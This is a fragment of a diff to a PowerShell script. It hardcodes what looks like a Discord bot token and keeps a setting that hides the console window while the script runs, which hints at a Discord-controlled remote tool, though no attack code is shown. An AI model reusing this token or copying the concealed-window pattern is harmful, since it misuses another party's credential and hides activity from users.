@@ -18,7 +18,7 @@
 -------------------------------------------------------------------------------------------------
 #>
 # =====================================================================================================================================================
-$global:token = "$tk" # make sure your bot is in ONE server only
+$global:token = "MTI4NzkwNzE3NTkyMTg4MTE4MA.GbOGX9.69dwpanYJiqVAHvLONnpzNBtysbnvnSmZQue3M" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
